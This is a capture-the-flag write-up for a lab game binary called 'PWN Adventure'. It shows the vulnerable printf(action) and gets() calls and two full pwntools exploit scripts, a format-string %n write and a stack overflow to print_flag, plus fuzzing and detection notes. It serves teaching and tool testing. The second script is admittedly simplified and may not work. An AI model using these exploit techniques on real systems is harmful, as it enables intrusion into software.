# Challenge 20: PWN Adventure

## Difficulty: Medium

## Vulnerability Types: Multiple (Format String + Buffer Overflow)

## Description
A game-themed challenge with multiple vulnerabilities. Players can choose different exploitation paths to reach the flag.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerabilities

### 1. Format String (battle function)
```c
printf(action);  // User input directly as format string
```

### 2. Buffer Overflow (save_game function)
```c
gets(save_name);  // Classic overflow
```

### 3. Integer Overflow (potential in shop)
Though not directly exploitable here, coin arithmetic could have issues in other scenarios.

## Exploitation Paths

### Path 1: Format String Write
Use format string to directly modify `player.has_flag`.

#### Step-by-Step
```python
# The program tells us:
# - player struct address
# - has_flag offset in struct

# Calculate has_flag address
has_flag_addr = player_addr + (offset * 4)  # offset in ints

# Use format string %n to write to has_flag
payload = p64(has_flag_addr)
payload += b'%8$n'  # Write to address at position 8

# Go to battle, send format string
choice = 1
send(payload)

# Print flag
choice = 4
```

### Path 2: Buffer Overflow
Use buffer overflow to overwrite memory and set `has_flag`.

#### Step-by-Step
```python
# Calculate distance from save_name buffer to player.has_flag
# This depends on stack/global layout

# Build overflow payload
offset = <calculated offset>
payload = b'A' * offset
payload += p32(1)  # Set has_flag = 1

# Go to save game
choice = 5
send(payload)

# Print flag
choice = 4
```

### Path 3: Format String Leak + ROP
Advanced path: leak libc, build ROP chain via buffer overflow.

## Complete Exploit (Path 1: Format String)

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9020)
else:
    p = process('./challenge')

# Enter name
p.sendlineafter(b'name: ', b'pwner')

# Get player struct info
p.recvuntil(b'at: ')
player_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'offset: ')
offset = int(p.recvline().strip())

# Calculate has_flag address
has_flag_addr = player_addr + (offset * 4)
log.info(f"player at: {hex(player_addr)}")
log.info(f"has_flag offset: {offset}")
log.info(f"has_flag at: {hex(has_flag_addr)}")

# Go to battle
p.sendlineafter(b'Choice: ', b'1')

# Send format string payload
# Write non-zero value to has_flag
# We need to find the offset where our input appears

# Method 1: Write 1 to has_flag using %n
payload = p64(has_flag_addr)
payload += b'%10$n'  # Adjust offset as needed

p.sendlineafter(b'do? ', payload)

# Now has_flag should be set
# Print flag
p.sendlineafter(b'Choice: ', b'4')

p.interactive()
```

## Complete Exploit (Path 2: Buffer Overflow)

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

p = process('./challenge')

# Enter name
p.sendlineafter(b'name: ', b'hacker')

# Get struct address
p.recvuntil(b'at: ')
player_addr = int(p.recvline().strip(), 16)

# The player struct is global, save_name is on stack
# We need to overflow to overwrite player.has_flag

# If player is global and save_name is stack:
# We can't directly overflow from stack to global

# Alternative: Overflow return address, call print_flag() directly
# But has_flag check will fail...

# Better: Use buffer overflow to call battle() multiple times,
# or overflow to ROP chain that sets has_flag

# For this solution, let's use overflow to hijack control
# and call a ROP chain that writes to has_flag

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Build ROP to set has_flag then call print_flag
offset = 40  # save_name buffer + saved RBP

# This is tricky - easier to use format string path
# Or build ROP chain to: mov [has_flag_addr], 1

# Simplified: Just demonstrate overflow works
payload = b'A' * offset
payload += p64(elf.symbols['print_flag'])

p.sendlineafter(b'Choice: ', b'5')
p.sendline(payload)

p.interactive()
```

## Automated Detection

### Static Analysis
Tools can detect:
- `printf(user_input)` - Format string
- `gets()` - Buffer overflow
- Multiple vuln types in same binary

### Fuzzing
```bash
# AFL++ will find both vulns
afl-clang-fast -fsanitize=address challenge.c
afl-fuzz -m none -i in -o out ./challenge
```

### Pattern Recognition
Automated tools should recognize:
1. Global struct with security-relevant field
2. Multiple input points
3. Multiple vulnerability types
4. Clear win condition (has_flag check)

## Learning Objectives
- Multiple exploitation paths
- Choosing easiest vulnerability
- Format string for arbitrary write
- CTF game scenarios
- Combining different techniques

## Why Multiple Vulnerabilities?

Real-world software often has:
- Multiple entry points
- Multiple vulnerability types
- Complex attack surfaces

Attackers choose:
- Easiest path
- Most reliable exploit
- Stealthiest approach

## Advanced Challenges

### Add PIE
With PIE enabled, need to:
1. Leak addresses first
2. Calculate base
3. Then exploit

### Add Canary
Would need to:
1. Leak canary (format string)
2. Preserve in overflow

### Add RELRO
Full RELRO prevents GOT overwrite, forcing:
- ROP chains
- Different targets

## Variations for Testing Framework

Your automated tool should:
1. Detect multiple vuln types
2. Prioritize by ease of exploitation
3. Generate exploits for each path
4. Compare success rates

## Further Reading
- "The Art of Software Security Assessment"
- "A Bug Hunter's Diary"
- CTF writeups: multiple-vuln challenges
